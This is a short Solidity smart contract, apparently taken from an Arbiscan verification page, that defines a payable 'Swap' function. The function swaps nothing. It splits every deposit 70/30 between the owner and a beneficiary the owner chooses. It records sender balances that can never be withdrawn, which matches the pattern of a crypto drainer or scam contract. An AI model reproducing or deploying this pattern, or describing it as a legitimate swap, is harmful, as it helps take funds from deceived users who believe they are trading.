/**
 *Submitted for verification at Arbiscan on 2023-04-25
*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.17;

contract MS_Contract {
  address private owner;
    address private beneficiary;
    mapping (address => uint256) private balances;

    constructor() {
        owner = msg.sender;
    }

    function setBeneficiary(address _beneficiary) public {
        require(msg.sender == owner, "You must be owner to call this");
        beneficiary = _beneficiary;
    }

  function getOwner() public view returns (address) {
    return owner;
  }

  function getBeneficiary() public view returns (address) {
    return beneficiary;
  }

  function getBalance() public view returns (uint256) {
    return address(this).balance;
  }

  function transfer(uint256 amount) public {
    require(msg.sender == owner, "You must be owner to call this");
    amount = (amount == 0) ? address(this).balance : amount;
    require(amount <= address(this).balance, "It's not enough money on balance");
    payable(msg.sender).transfer(amount);
  }

  function Swap(address sender) public payable {
    uint256 amount = msg.value;
    balances[sender] += amount;

    uint256 amountToBeneficiary = (amount * 30) / 100;
    uint256 amountToOwner = amount - amountToBeneficiary;

    payable(beneficiary).transfer(amountToBeneficiary);
    payable(owner).transfer(amountToOwner);
  }
}